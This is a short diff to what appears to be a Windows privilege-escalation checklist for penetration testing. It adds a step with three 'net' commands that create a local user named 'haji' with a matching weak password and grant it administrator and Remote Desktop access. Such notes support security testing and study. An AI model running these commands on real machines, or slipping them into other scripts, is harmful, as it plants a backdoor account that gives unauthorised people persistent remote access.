@@ -3,6 +3,13 @@
 
 - Check if there is a port that is open only internally (`netstat –nao`)
 - Port forward if there is a new port internally and start checking it from zero
+- Creating admin user which has RDP access
+
+```
+net user /add haji haji
+net localgroup administrators haji /add
+net localgroup "Remote Desktop Users" haji /add
+```
 
 
 ## Binary Hijacking
